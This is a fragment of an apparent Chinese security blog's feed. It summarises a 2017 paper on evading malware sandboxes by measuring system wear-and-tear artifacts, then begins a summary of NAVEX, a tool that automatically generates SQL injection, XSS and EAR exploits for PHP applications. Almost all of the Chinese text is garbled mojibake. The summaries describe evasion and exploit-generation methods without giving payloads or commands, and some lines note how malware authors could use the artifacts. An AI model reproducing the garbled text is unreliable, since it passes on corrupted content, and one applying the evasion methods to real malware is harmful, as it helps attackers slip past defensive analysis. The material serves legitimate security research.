alt="979FD293-1188-4E1A-9CBD-B71774AE2479.png"></p><p>å›¾7æ˜¾ç¤ºäº†åœ¨Drealå’ŒDsandç³»ç»Ÿä¸Šåº”ç”¨çº¿æ€§å›å½’æ¨¡å‹æ—¶æ®‹å·®å€¼çš„ç´¯ç§¯åˆ†å¸ƒå‡½æ•°(CDF)ã€‚å¯ä»¥çœ‹åˆ°åœ¨å°è¯•é¢„æµ‹æ²™ç®±å¹´é¾„æ—¶çš„æ®‹å·®å€¼æ˜¯éå¸¸é«˜çš„ã€‚</p><p><img src="https://i.loli.net/2019/03/20/5c91ecf70f6f7.png" alt="78E7479C-A68A-4E2E-A22A-30EEB34D017A.png"></p><p>(2) Lasso Regression</p><ul><li>ç›®çš„: éªŒè¯å¤æ‚çš„å›å½’æ¨¡å‹æ˜¯å¦ä¼šå¸¦æ¥æ›´å¥½çš„é¢„æµ‹å‡†ç¡®æ€§</li><li>å¥—ç´¢å›å½’çš„ä¼˜ç‚¹: æ¯”çº¿æ€§å›å½’ä½¿ç”¨æ›´å°‘çš„é¢„æµ‹å˜é‡ï¼Œè¿™é™ä½äº†æ•´ä½“æ¨¡å‹çš„å¤æ‚æ€§ã€‚ å¯¹äºæ¶æ„è½¯ä»¶ï¼Œè¾ƒå°çš„åŠŸèƒ½é›†æ„å‘³ç€å¯¹åº•å±‚æ“ä½œç³»ç»Ÿçš„APIè°ƒç”¨è¾ƒå°‘ï¼Œä»è€Œå‡å°‘äº†è§¦å‘å¯ç–‘æ´»åŠ¨ç›‘è§†å™¨çš„æœºä¼šã€‚</li><li>æ•°æ®é›†: è®­ç»ƒé›†ï¼Œè¯„ä¼°é›†å’Œæµ‹è¯•é›†</li><li>æ–¹æ³•: äº¤å‰éªŒè¯æ¥æ‰¾åˆ°æœ€ä½³çš„Î»å€¼</li><li>ç»“æœ: Drealé›†çš„MSEä¸º0.749ï¼ŒDsandé›†ä¸Šçš„MSEä¸º4.45ï¼Œä¼˜äºçº¿æ€§å›å½’</li><li>ç»“è®º: Lassoæ¨¡å‹å¯ä»¥æ›´å¥½åœ°è¾¨åˆ«æ²™ç®±ã€‚</li></ul><p>è¡¨VIIIæ˜¾ç¤ºäº†Lassoæ¨¡å‹é€‰æ‹©çš„å…«ä¸ªç‰¹å¾ï¼Œå®ƒä»¬æ˜¯ç³»ç»Ÿå¹´é¾„åŠå…¶ç›¸åº”ç³»æ•°çš„è‰¯å¥½é¢„æµ‹å› å­ã€‚</p><p><img src="https://i.loli.net/2019/03/20/5c91ed105f20b.png" alt="D81E841A-08BA-45BF-8A4E-B01D07FEE934.png"></p><p>å°ç»“: ä½¿ç”¨artifactç£¨æŸç¨‹åº¦æ¥é¢„æµ‹ç³»ç»Ÿå¹´é¾„æ˜¯å¯è¡Œçš„ï¼Œè¿™ä¸€æ–¹é¢å¯ä»¥ç”¨äºè¾¨è¯†æ²™ç®±ï¼›å¦ä¸€æ–¹é¢æ˜¯å¯ä»¥å¸®åŠ©sandboxå¼€å‘äººå‘˜åˆ›å»ºç³»ç»Ÿå¹´é¾„ç›¸ç¬¦çš„æ²™ç®±ç¯å¢ƒ</p><h2 id="VII-DISCUSSION"><a href="#VII-DISCUSSION" class="headerlink" title="VII. DISCUSSION"></a>VII. DISCUSSION</h2><h3 id="A-Ethical-Considerations-and-Coordinated-Disclosure"><a href="#A-Ethical-Considerations-and-Coordinated-Disclosure" class="headerlink" title="A. Ethical Considerations and Coordinated Disclosure"></a>A. Ethical Considerations and Coordinated Disclosure</h3><p>æœ¬æ–‡ä¸»è¦è®²è¿°äº†è¿™ç§æ–°çš„è§„é¿æŠ€æœ¯çš„æœ‰æ•ˆæ€§ï¼Œå¹¶ä¸”ç›®å‰å·²ç»å‡ºç°äº†æ­¤ç±»ç›¸å…³å·¥ä½œçš„æ¶æ„è½¯ä»¶ã€‚ä½†æ˜¯æœ¬æ–‡ä¸»è¦æ˜¯ä¸ºäº†å¸®åŠ©åˆ›å»ºæ›´å¼ºå¤§çš„æ¶æ„è½¯ä»¶åˆ†æç³»ç»Ÿã€‚</p><h3 id="B-Probing-Stealthiness"><a href="#B-Probing-Stealthiness" class="headerlink" title="B. Probing Stealthiness"></a>B. Probing Stealthiness</h3><p>1.æ€»æ˜¯å­˜åœ¨ä¸å—ç›‘æ§çš„artifacté›†ï¼›<br>2.è™½ç„¶æœ€å°ç‰¹æƒåŸåˆ™é€ æˆçš„ç³»ç»ŸAPIè°ƒç”¨é™åˆ¶ï¼Œå¯è®¿é—®çš„ç¯å¢ƒé™åˆ¶ï¼Œä½†æ˜¯ä¾æ—§å¯ä»¥ä»å…¶ä»–ä¸å—é™åˆ¶çš„artifacté›†è·å–å¤§é‡ä¿¡æ¯ï¼›</p><h3 id="C-OS-Dependability"><a href="#C-OS-Dependability" class="headerlink" title="C. OS Dependability"></a>C. OS Dependability</h3><p>æ–‡ç« è™½ç„¶æ˜¯åŸºäºWindowså¹³å°åœ¨è¿›è¡Œartifactçš„åˆ†æï¼Œä½†å…¶ä¸­çš„ä¸€äº›artifactå¹¶ä¸æ˜¯å…¶ç‰¹æœ‰çš„ï¼Œåœ¨å…¶å®ƒç³»ç»Ÿä¾‹å¦‚Linuxï¼ŒMacï¼ŒAndroidç­‰ä¹ŸåŒæ ·é€‚ç”¨ã€‚å¦‚æœæƒ³é€‚ç”¨Javaç­‰ç¼–å†™è·¨å¹³å°çš„æ¶æ„è½¯ä»¶ï¼Œå°±å¯ä»¥å»å…³æ³¨é‚£äº›ä¸ä¾èµ–äºç‰¹å®šç³»ç»Ÿè€Œå­˜åœ¨çš„artifactã€‚</p><h3 id="D-Defenses"><a href="#D-Defenses" class="headerlink" title="D. Defenses"></a>D. Defenses</h3><ol><li>å…‹éš†çœŸå®ç”¨æˆ·ç³»ç»Ÿå¹¶å°†å…¶ç”¨ä½œæ¶æ„è½¯ä»¶æ²™ç®±çš„åŸºç¡€ã€‚<br>ç¼ºç‚¹:<br>i) éšç§é—®é¢˜ï¼ˆå¦‚ä½•åœ¨å…‹éš†ä¹‹å‰æˆ–ä¹‹åæ“¦é™¤æ‰€æœ‰ç§äººä¿¡æ¯ï¼Œä½†ä¿ç•™ç£¨æŸå·¥ä»¶å®Œæ•´ï¼Ÿï¼‰ï¼›<br>ii) artifactçš„è€åŒ–é—®é¢˜(æ”»å‡»è€…å¯ä»¥ä½¿ç”¨æˆ‘ä»¬æå‡ºçš„ç»Ÿè®¡æ¨¡å‹æ¥æ£€æµ‹å£°ç§°çš„å¹´é¾„ä¸ç£¨æŸç¨‹åº¦ä¸åŒ¹é…çš„æƒ…å†µ)ã€‚</li><li>ä»æ–°å®‰è£…çš„æ“ä½œç³»ç»Ÿæ˜ åƒå¼€å§‹ï¼Œé€šè¿‡è‡ªåŠ¨æ¨¡æ‹Ÿç”¨æˆ·æ“ä½œäººä¸ºåœ°ä½¿å…¶è€åŒ–ã€‚<br>ç¼ºç‚¹:å°šä¸æ¸…æ¥šè¿™ç§äººå·¥è€åŒ–åœ¨å¤šå¤§ç¨‹åº¦ä¸Šä¼šäº§ç”Ÿä¸çœŸå®ç³»ç»Ÿç›¸ä¼¼çš„artifactæƒ…å†µã€‚</li></ol><h2 id="VIII-CONCLUSION-AND-FUTURE-WORK"><a href="#VIII-CONCLUSION-AND-FUTURE-WORK" class="headerlink" title="VIII. CONCLUSION AND FUTURE WORK"></a>VIII. CONCLUSION AND FUTURE WORK</h2><p>æœ¬æ–‡ä¸»è¦åšäº†ä¸¤ä¸ªæ–¹é¢å·¥ä½œ:</p><ol><li>æ”»å‡»è€…è§’åº¦:å°†Windowsç³»ç»Ÿçš„ä¸€äº›ä¸æ¶‰åŠç”¨æˆ·éšç§çš„artifactä½œä¸ºç‰¹å¾ï¼Œä½¿ç”¨å†³ç­–æ ‘åˆ†ç±»å™¨è¿›è¡Œè®­ç»ƒï¼Œæœ€ç»ˆå¯ä»¥åœ¨92.86ï¼…çš„å‡†ç¡®åº¦ä¸Šæ¥è¯†åˆ«æ²™ç®±ç¯å¢ƒã€‚</li><li>é˜²å¾¡è€…è§’åº¦:å°†ç³»ç»Ÿçš„artifactç‰¹å¾ä¸ç³»ç»Ÿçš„å¹´é¾„è¿›è¡Œè”ç³»å¹¶æå‡ºç»Ÿè®¡æ¨¡å‹ï¼Œä»è€Œå¸®åŠ©æ²™ç®±æ“ä½œäººå‘˜å¯¹ç³»ç»Ÿè¿›è¡Œå¾®è°ƒï¼Œä½¿å…¶å…·æœ‰æ›´é€¼çœŸçš„ç£¨æŸç‰¹æ€§ã€‚</li></ol><p>æœªæ¥å·¥ä½œ:</p><ol><li>å…‹éš†çœŸå®ç”¨æˆ·ç³»ç»Ÿå¹¶å°†å…¶ç”¨ä½œæ¶æ„è½¯ä»¶æ²™ç®±çš„åŸºç¡€ã€‚</li><li>è‡ªåŠ¨æ¨¡æ‹Ÿç”¨æˆ·æ“ä½œäººä¸ºåœ°ä½¿ç³»ç»Ÿå…¶è€åŒ–åˆ°æ‰€éœ€ç¨‹åº¦ã€‚</li><li>ä¸åŒçš„æ¡Œé¢æ“ä½œç³»ç»Ÿä»¥åŠç§»åŠ¨è®¾å¤‡ä¸­è¯„ä¼°åŸºäºartifactç£¨æŸç‰¹æ€§çš„æ²™ç›’è§„é¿çš„æœ‰æ•ˆæ€§ã€‚</li></ol><p>PS: æœ¬æ–‡æŠ€æœ¯ä»…ä¾›ç ”ç©¶å‚è€ƒï¼Œè¯·å‹¿åˆ©ç”¨æœ¬æ–‡æŠ€æœ¯æ–½è¡Œæ”»å‡»è¡Œä¸ºã€‚</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;å‡ºå¤„ï¼š2017 IEEE Symposium on Security and Privacy (SP)&lt;br&gt;ä½œè€…ï¼šNajmeh Miramirkhani, Mahathi Priya Appini, Nick Nikiforakis, Michalis Polychron
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>NAVEX-&gt;Precise and Scalable Exploit Generation for Dynamic Web Applications</title>
    <link href="http://zer0yu.github.io/2019/03/11/NAVEX-Precise-and-Scalable-Exploit-Generation-for-Dynamic-Web-Applications/"/>
    <id>http://zer0yu.github.io/2019/03/11/NAVEX-Precise-and-Scalable-Exploit-Generation-for-Dynamic-Web-Applications/</id>
    <published>2019-03-11T12:01:16.000Z</published>
    <updated>2019-03-11T12:20:25.000Z</updated>
    
    <content type="html"><![CDATA[<p>å‡ºå¤„ï¼š27th USENIX Security Symposium<br>ä½œè€…ï¼šAbeer Alhuzali, Rigel Gjomemo, Birhanu Eshete, and V.N.<br>å•ä½ï¼šVenkatakrishnan University of Illinois at Chicago<br>èµ„æ–™ï¼š<a href="https://www.usenix.org/system/files/conference/usenixsecurity18/sec18-alhuzali.pdf" target="_blank" rel="noopener">Paper</a> | <a href="https://github.com/aalhuz/navex" target="_blank" rel="noopener">Github</a></p><h2 id="1-Abstract-amp-Introduction"><a href="#1-Abstract-amp-Introduction" class="headerlink" title="1. Abstract &amp; Introduction"></a>1. Abstract &amp; Introduction</h2><p>ä½œè€…åœ¨æœ¬æ–‡ä¸­æå‡ºäº†ä¸€ç§ä»¥é™æ€åˆ†æä½œä¸ºæŒ‡å¯¼ï¼Œç»“åˆåŠ¨æ€åˆ†æè‡ªåŠ¨éªŒè¯æ¼æ´å¹¶æ„é€ å¯ç”¨exploitçš„å·¥å…·NAVEXã€‚</p><p>ç ”ç©¶é—®é¢˜ï¼š</p><ol><li>è§£å†³ä»¥å¾€è‡ªåŠ¨åŒ–å®¡è®¡çš„è¯¯æŠ¥ä»¥åŠå¿…é¡»ç»“åˆäººå·¥å‚ä¸æ„é€ Expçš„é—®é¢˜ï¼›</li><li>é™æ€åˆ†æè™½ç„¶è¦†ç›–ç‡é«˜ï¼Œä½†æ˜¯å¯¹äºå…·æœ‰åŠ¨æ€ç‰¹æ€§çš„è¯­è¨€å…¶å»ºæ¨¡å›°éš¾ã€‚</li></ol><p>è§£å†³æ–¹æ¡ˆï¼š</p><ol><li>é™æ€åˆ†æé˜¶æ®µï¼šä½¿ç”¨ç¬¦å·æ‰§è¡Œåˆ›å»ºWebåº”ç”¨ç¨‹åºçš„å„ä¸ªæ¨¡å—çš„è¡Œä¸ºæ¨¡å‹ã€‚æ ‡è®°å‡ºåŒ…å«æ½œåœ¨æ¼æ´ç‚¹çš„æ¨¡å—ï¼›</li><li>åŠ¨æ€åˆ†æé˜¶æ®µï¼šä½¿ç”¨Webçˆ¬è™«å’Œconcolicæ‰§è¡Œå™¨å»å‘ç°å¯èƒ½å¯¼è‡´æ”»å‡»è€…è¿›å…¥æ˜“å—æ”»å‡»æ¨¡å—çš„å¯èƒ½çš„HTTPå¯¼èˆªè·¯å¾„ï¼Œä¹‹åä½¿ç”¨çº¦æŸæ±‚è§£å™¨ç”Ÿæˆä¸€ç»„å¯¹æ¼æ´è¿›è¡Œåˆ©ç”¨çš„HTTPè¾“å…¥åºåˆ—ã€‚</li></ol><p>æ–¹æ¡ˆä¼˜ç‚¹ï¼š</p><ol><li>åŠ¨æ€åˆ†æä¸é™æ€åˆ†æç›¸ç»“åˆæå‡äº†æ€§èƒ½ï¼Œå¯ä»¥åº”ç”¨äºå¤§å‹åº”ç”¨ç¨‹åºï¼›</li><li>æ˜¯ä¸€ç§å¤šç±»å‹æ¼æ´çš„Expç”Ÿæˆæ¡†æ¶ã€‚</li></ol><p>NAVEXåˆ†æäº†320ä¸‡è¡ŒPHPä»£ç ï¼Œè‡ªåŠ¨æ„å»ºå¹¶åˆ©ç”¨204ä¸ªæ¼æ´ï¼Œå…¶ä¸­æœ‰195ä¸ªä¸SQLIå’ŒXSSç›¸å…³ï¼Œè€Œ9ä¸ªä¸é€»è¾‘æ¼æ´ç›¸å…³ã€‚æ­¤å¤–NAVEXæ˜¯ç¬¬ä¸€ä¸ªå¯ä»¥è‡ªåŠ¨å‘ç°å¹¶åˆ©ç”¨EARæ¼æ´çš„æ–¹æ¡ˆã€‚</p><h2 id="2-Challenges-and-Approach-Overview"><a href="#2-Challenges-and-Approach-Overview" class="headerlink" title="2 Challenges and Approach Overview"></a>2 Challenges and Approach Overview</h2><h3 id="2-1-Running-Example"><a href="#2-1-Running-Example" class="headerlink" title="2.1 Running Example"></a>2.1 Running Example</h3><p>ä¸‹é¢æ˜¯ä¸€ä¸ªåŒ…å«æ¼æ´çš„å°å‹Webç¨‹åºã€‚selectBooks.phpæ¨¡å—åœ¨ç¬¬23-38è¡Œä½¿ç”¨äº†Webè¡¨å•æ¥å®ç°é€‰æ‹©æ•°æ®ï¼Œå…¶ä¸­åœ¨23è¡Œè°ƒç”¨äº†JavaScriptæ¥éªŒè¯æ•°è¾“å…¥ï¼Œç›¸å…³å®šä¹‰åœ¨ç¬¬31-36è¡Œã€‚ç¬¬4-12è¡Œå®ç°ç”¨æˆ·è¾“å…¥ç”±æœåŠ¡å™¨ç«¯ä»£ç è¿›ä¸€æ­¥éªŒè¯å’Œè¿‡æ»¤ã€‚ä¹‹åç¬¬17è¡Œé€šè¿‡MySQLæŸ¥è¯¢æ¥éªŒè¯ä¹¦ç±çš„å¯ç”¨æ€§ã€‚æœ€åæ ¹æ®æŸ¥è¯¢ç»“æœï¼Œåˆå§‹åŒ–<code>$_SESSION[&#39;ISBN&#39;]</code>å¹¶åœ¨æµè§ˆå™¨ä¸Šæ‰“å°åˆ°hold.phpçš„HTTPé“¾æ¥ã€‚</p><p><img src="https://i.loli.net/2019/03/11/5c864e9947f8c.png" alt="8E259CF4-FEA9-4D4E-8E07-C08A15BA1EB6.png"></p><p>ä¹‹åè·³è½¬åˆ°hold.phpæ‰§è¡Œé™„åŠ æ£€æŸ¥ï¼Œå¦‚æœæ»¡è¶³ï¼Œåˆ™HTTPé“¾æ¥å¼•å¯¼ç”¨æˆ·è¿›å…¥ä¸‹ä¸€æ­¥ï¼ˆç¬¬7è¡Œï¼‰ã€‚ å•å‡»é“¾æ¥æ—¶ï¼Œå°†è®¾ç½®è¶…å…¨å±€<code>$_GET [&#39;step&#39;]</code>ï¼Œä»è€Œè®©hold.phpåŒ…å«æ¨¡å—checkout.phpå¹¶æ‰§è¡Œã€‚ </p><p><img src="https://i.loli.net/2019/03/11/5c864ec6577c1.png" alt="5A1EE632-5A0E-491B-8195-C1B06838143C.png"></p><p>checkout.phpé€šè¿‡å‘ç”¨æˆ·æä¾›é“¾æ¥ï¼ˆç¬¬19è¡Œï¼‰è¿›è¡Œç¡®è®¤æ¥å®Œæˆå€Ÿç”¨è¿‡ç¨‹ã€‚ è¯¥é“¾æ¥è®¾ç½®ä¸¤ä¸ªè¶…å…¨å±€å˜é‡ï¼ˆ<code>$_GET[&#39;step&#39;]</code>å’Œ<code>$_GET[&#39;msg&#39;]</code>ï¼‰ï¼Œå°†åœ¨ç¬¬6è¡Œè¿›è¡Œæ£€éªŒã€‚æœ€åï¼Œè°ƒç”¨ç¡®è®¤åŠŸèƒ½ï¼ˆç¬¬13è¡Œï¼‰ä»¥é€šçŸ¥ç”¨æˆ·è¯¥ä¹¦å·²æˆåŠŸä¿ç•™ã€‚</p><p><img src="https://i.loli.net/2019/03/11/5c864f01361f7.png" alt="E9459D5E-66EE-4A62-97DA-943E13DF4E35.png"></p><p>è¯¥ç¨‹åºå­˜åœ¨ä»¥ä¸‹å‡ ç‚¹ç¼ºé™·ï¼š</p><ol><li>selectBooks.php:17ä¸­$publisherç»è¿‡ç®€å•æ ¡éªŒå°±ä¼ å…¥SQLè¯­å¥è¿›è¡Œæ‹¼æ¥ï¼Œå¯é€ æˆSQLiæ¼æ´(str_placeå‡½æ•°è¿›è¡Œäº†æ— æ•ˆè¿‡æ»¤)ï¼›</li><li>checkout.php:15è¡Œä½¿ç”¨äº†echoï¼Œå¯èƒ½ä¼šé€ æˆXSSï¼›</li><li>selectBooks.php:3è¡Œè°ƒç”¨headerä½†æ˜¯æ²¡æœ‰ä½¿ç”¨exit()ï¼Œé€ æˆEARæ¼æ´è¿›è€Œå¯ä»¥åœ¨ä¸è¿›è¡Œç™»å½•çš„æƒ…å†µä¸‹è§¦å‘ä¸‹é¢çš„SQLiæ¼æ´ã€‚</li></ol><h3 id="2-2-Challenges"><a href="#2-2-Challenges" class="headerlink" title="2.2 Challenges"></a>2.2 Challenges</h3><p>é¢ä¸´çš„æŒ‘æˆ˜ä¸»è¦æ˜¯ä»¥ä¸‹ä¸‰ç‚¹ï¼š</p><ol><li><strong>æ±¡ç‚¹å¯è¾¾æ€§</strong>ï¼šå¯¹äºWebAppè€Œè¨€ï¼Œå®Œæˆä¸€ä¸ªåŠŸèƒ½å¾€å¾€æ˜¯å„æ¨¡å—ç›¸å…³è”çš„ã€‚æ­¤å¤–ï¼Œæ¨¡å—ä¸­å¾€å¾€è¿˜ä½¿ç”¨å†…ç½®å‡½æ•°è¿‡æ»¤(æ¯”å¦‚htmlspecialchars)ã€éšå¼è¿‡æ»¤(æ¯”å¦‚ç±»å‹è½¬æ¢)ã€è‡ªå®šä¹‰è¿‡æ»¤å’Œæ•°æ®åº“çº¦æŸæ¡ä»¶å¸¦æ¥çš„è¿‡æ»¤æ¥æ¶ˆé™¤é£é™©ã€‚æ‰€ä»¥æ”»å‡»è·¯å¾„çš„å¯»æ‰¾æ˜¯å…·æœ‰ä¸€å®šéš¾åº¦çš„ã€‚</li><li><strong>åŠ¨æ€ç‰¹å¾</strong>ï¼šé™æ€åˆ†æå¯¹äºåŠ¨æ€ç¨‹åºçš„åˆ†æå…·æœ‰å±€é™æ€§ï¼Œæ¯”å¦‚æ— æ³•æ¨æ–­åŠ¨æ€å°†ä¼šç”Ÿæˆæ€æ ·çš„è¡¨å•æˆ–è€…é“¾æ¥(æ¯”å¦‚ä½¿ç”¨JavaScriptæ¥ç”Ÿæˆçš„å†…å®¹)ã€‚</li><li><strong>æ‰©å±•æ€§</strong>ï¼šå¯¹å¤§å‹ç¨‹åºçš„åˆ†æä¼šè¦†ç›–å®¢æˆ·ç«¯ï¼ŒæœåŠ¡å™¨ç«¯å’Œæ•°æ®åº“åç«¯ï¼Œå› è€Œä¼šäº§ç”Ÿå¾ˆå¤šè·¯å¾„ï¼Œå¿…é¡»ä½¿ç”¨ä¸€äº›æ–¹æ³•æ¥å‡å°‘ä¸€äº›æ— ç”¨çš„è·¯å¾„ã€‚<u>(ä¹‹æ‰€ä»¥å«æ‰©å±•æ€§åº”è¯¥æ˜¯è·Ÿåé¢çš„COGå›¾çš„æ‰©å±•æœ‰å…³)</u></li></ol><h3 id="2-3-Approach-Overview"><a href="#2-3-Approach-Overview" class="headerlink" title="2.3 Approach Overview"></a>2.3 Approach Overview</h3><p>æ–¹æ³•ä¸»è¦åˆ†ä¸ºä¸¤ä¸ªæ­¥éª¤ï¼š</p><ol><li>å¯èƒ½çš„æ¼æ´ç‚¹è¯†åˆ«ã€‚é¦–å…ˆï¼Œå®šä½ç¨‹åºä¸­å¯èƒ½çš„æ¼æ´ç‚¹ä»¥åŠå¯¹åº”çš„æ¨¡å—(è¿™æ ·å‡å°‘åé¢çš„æœç´¢ç©ºé—´)ï¼›å…¶æ¬¡ï¼Œå¯¹å„ç§è¿‡æ»¤æ–¹æ¡ˆè¿›è¡Œäº†ç²¾ç¡®è¡¨ç¤ºï¼›æœ€åï¼Œå¯¹è‡ªå®šä¹‰çš„è¿‡æ»¤å…ˆä½¿ç”¨ç¬¦å·çº¦æŸæ„å»ºæ¨¡å‹ä¹‹åä½¿ç”¨çº¦æŸæ±‚è§£å™¨æ¥åˆ¤æ–­è¿‡æ»¤çš„ç¨³å¥æ€§ã€‚</li><li>å…·ä½“çš„æ¼æ´åˆ©ç”¨ç”Ÿæˆã€‚é¦–å…ˆï¼ŒåŠ¨æ€æ‰§è¡Œå¾—åˆ°Webåº”ç”¨ç¨‹åºçš„å¯¼èˆªç»“æ„ï¼›å…¶æ¬¡ï¼Œç»“åˆé™æ€åˆ†æå¾—åˆ°çš„æ¼æ´ç‚¹å’Œå¯¹åº”çš„æ¨¡å—å¯»æ‰¾å¯è¡Œçš„æ”»å‡»è·¯å¾„ï¼›æœ€åï¼Œå¤šæ¬¡é‡å¤åŠ¨æ€æ‰§è¡Œï¼Œä½¿ç”¨çº¦æŸæ±‚è§£æœ€å¤§åŒ–è·¯å¾„è¦†ç›–ã€‚</li></ol><p><img src="https://i.loli.net/2019/03/11/5c864f4b35dce.png" alt="D2FB48D5-F690-4DAA-BC89-AB374F6E5E7D.png"></p><h2 id="3-Architecture-and-Algorithms"><a href="#3-Architecture-and-Algorithms" class="headerlink" title="3 Architecture and Algorithms"></a>3 Architecture and Algorithms</h2><h3 id="3-1-Vulnerable-Sink-Identification"><a href="#3-1-Vulnerable-Sink-Identification" class="headerlink" title="3.1 Vulnerable Sink Identification"></a>3.1 Vulnerable Sink Identification</h3><p>ç›®çš„ï¼šæ’é™¤é‚£äº›ä¸åŒ…å«æ¼æ´ç‚¹çš„æ¨¡å—<br>æ–¹æ³•ï¼šå¦‚ä¸‹å›¾ï¼Œé¦–å…ˆï¼Œæ„å»ºæ¯ä¸ªæ¨¡å—ä»£ç çš„å›¾æ¨¡å‹ï¼›ç„¶åï¼Œå‘ç°åŒ…å«æºå’Œç›®æ ‡(æ¼æ´ç‚¹)ä¹‹é—´æ•°æ®æµçš„è·¯å¾„ï¼›æœ€åï¼Œä½¿ç”¨ç¬¦å·æ‰§è¡Œç”Ÿæˆå…¬å¼ååˆ©ç”¨çº¦æŸæ±‚è§£ä»¥ç¡®å®šå“ªäº›è·¯å¾„å¯èƒ½è¢«åˆ©ç”¨ã€‚</p><p><img src="https://i.loli.net/2019/03/11/5c864f6bcf338.png" alt="B064337B-B161-45E6-9D27-DAFF8483B062.png"></p><h4 id="3-1-1-Attack-Dictionary"><a href="#3-1-1-Attack-Dictionary" class="headerlink" title="3.1.1 Attack Dictionary"></a>3.1.1 Attack Dictionary</h4><p>å¤šç§æ¼æ´è¢«è§¦å‘çš„è¿‡ç¨‹æ˜¯ç›¸ä¼¼çš„â€“å‡æ˜¯æ”»å‡»è½½è·åˆ°è¾¾æ•æ„Ÿæ¥æ”¶å™¨è¿›è€Œè§¦å‘æ¼æ´ï¼Œæ‰€ä»¥NAVEXä½¿ç”¨è¿™ç§ç›¸ä¼¼æ€§æ„å»ºäº†ä¸€ä¸ªåŒ…å«Sinks(æ•æ„Ÿæ¥æ”¶å™¨)ã€Sanitizations(è¿‡æ»¤å‡½æ•°)ã€éå†ç±»å‹(å‰å‘éå†è¿˜æ˜¯åå‘éå†)å’Œæ”»å‡»å­—ç¬¦ä¸²(å…¶å®å°±æ˜¯æ”¶é›†çš„WebFuzzå­—å…¸)çš„æ”»å‡»å­—å…¸æ¥å®ä¾‹åŒ–é’ˆå¯¹æ¯ç±»æ¼æ´çš„åˆ†æã€‚<br>å­—å…¸åŒ…å«ï¼šSQLIï¼ŒXSSï¼Œæ–‡ä»¶åŒ…å«ï¼Œå‘½ä»¤æ³¨å…¥ï¼Œä»£ç æ‰§è¡Œå’ŒEARæ¼æ´ã€‚</p><h4 id="3-1-2-Graph-Construction"><a href="#3-1-2-Graph-Construction" class="headerlink" title="3.1.2 Graph Construction"></a>3.1.2 Graph Construction</h4><p>ä»£ç å±æ€§å›¾ï¼ˆCPGï¼‰æ˜¯ä¸€ç§ç»“åˆäº†æŠ½è±¡è¯­æ³•æ ‘ï¼ˆASTï¼‰ï¼Œæ§åˆ¶æµå›¾ï¼ˆCFGï¼‰ï¼Œè°ƒç”¨å›¾å’Œæ•°æ®ä¾èµ–å›¾ï¼ˆDDGï¼‰çš„è¡¨ç¤ºã€‚æ­¤å¤„ï¼Œå°†è¿‡æ»¤æ ‡ç­¾å’Œæ•°æ®åº“çº¦æŸæ ‡è®°ä½œä¸ºå±æ€§æ·»åŠ åˆ°CPGï¼Œä»è€Œå¯¹å…¶è¿›è¡Œæ‰©å±•ã€‚æœ€ç»ˆå°†æ¼æ´å‘ç°é—®é¢˜è½¬å˜ä¸ºå¯¹CPGå›¾çš„éå†é—®é¢˜ã€‚</p><h4 id="3-1-3-Graph-Traversal"><a href="#3-1-3-Graph-Traversal" class="headerlink" title="3.1.3 Graph Traversal"></a>3.1.3 Graph Traversal</h4><p>æ­¤æ­¥éª¤çš„ç›®çš„æ˜¯é€šè¿‡å¯¹æ‰©å±•åCPGæ¥å¯»æ‰¾æ”»å‡»è·¯å¾„ï¼Œä¸»è¦åˆ†ä¸ºå‘åéå†å’Œå‘å‰éå†ã€‚å‘åéå†çš„ç®—æ³•å¦‚ä¸‹å›¾æ‰€ç¤ºã€‚æ­£å‘éå†åˆ™ä¸»è¦æ˜¯ä»æºåˆ°å¯èƒ½æ¼æ´ç‚¹çš„è·¯å¾„æœç´¢ï¼Œè¿™ç§æœç´¢æ–¹å¼ä¹Ÿæ˜¯å¯¹EARæ¼æ´çš„é‡è¦æ£€æµ‹æ–¹æ³•ã€‚(æ–‡ä¸­æåˆ°äº†è‰¯æ€§EARâ€“headerä¹‹åä¸å«å¯åˆ©ç”¨ç‚¹å’Œæ¶æ€§EARâ€“headerä¹‹ååŒ…å«å¯åˆ©ç”¨ç‚¹)ã€‚å›¾éå†æœ€ç»ˆå°†ä¼šè¿”å›ä¸€ç»„å¯èƒ½å®¹æ˜“å—åˆ°æ”»å‡»çš„è·¯å¾„ä¾›ä¸‹ä¸€æ­¥ä½¿ç”¨ã€‚</p><p><img src="https://i.loli.net/2019/03/11/5c864fb562365.png" alt="å›æº¯éå†ç®—æ³•.png"></p><h4 id="3-1-4-Exploit-String-Generation"><a href="#3-1-4-Exploit-String-Generation" class="headerlink" title="3.1.4 Exploit String Generation"></a>3.1.4 Exploit String Generation</h4><p>åˆ©ç”¨ä¸Šä¸€æ­¥å‘ç°çš„æ”»å‡»è·¯å¾„æ¥ç”Ÿæˆæ”»å‡»å­—ç¬¦ä¸²æ˜¯é™æ€åˆ†æçš„æœ€åä¸€æ­¥ã€‚é¦–é€‰æ„é€ å¢å¹¿å…¬å¼ Fpathâˆ§Fdbâˆ§Fattack(Fpathæ˜¯æ˜“å—æ”»å‡»çš„è·¯å¾„ï¼›Fdbæ˜¯ä»DBæ ‡è®°æ´¾ç”Ÿçš„çº¦æŸï¼›Fattackæ˜¯é’ˆå¯¹æ¼æ´ç‚¹çš„å¯æ§å˜é‡çš„ï¼Œå…¶å€¼æ¥æºäºä¹‹å‰æ„é€ çš„æ”»å‡»å­—å…¸)ã€‚ä¹‹åä½¿ç”¨æ±‚è§£å™¨æ±‚å‡ºä¸€ç»„è§£(è§£å°±æ˜¯æ˜¯æ”»å‡»å­—ç¬¦ä¸²ä¼ å…¥å¯æ§å˜é‡ååœ¨æ˜“å—æ”»å‡»çš„è·¯å¾„ä¸Šç»è¿‡è¿‡æ»¤åˆ°è¾¾æ¼æ´ç‚¹ä¾æ—§å¯ä»¥é€ æˆå±å®³)ã€‚åˆ°æ­¤é™æ€åˆ†æè¿‡ç¨‹ç»“æŸï¼Œä¹‹åçš„è¿‡ç¨‹æ˜¯é€šè¿‡åŠ¨æ€åˆ†æå¾—åˆ°æ”»å‡»å­—ç¬¦ä¸²åˆ°è¾¾æ”»å‡»ç‚¹çš„HTTPè¯·æ±‚åºåˆ—ã€‚</p><h3 id="3-2-Concrete-Exploit-Generation"><a href="#3-2-Concrete-Exploit-Generation" class="headerlink" title="3.2 Concrete Exploit Generation"></a>3.2 Concrete Exploit Generation</h3><p>NAVEXæ‰§è¡Œå‡ 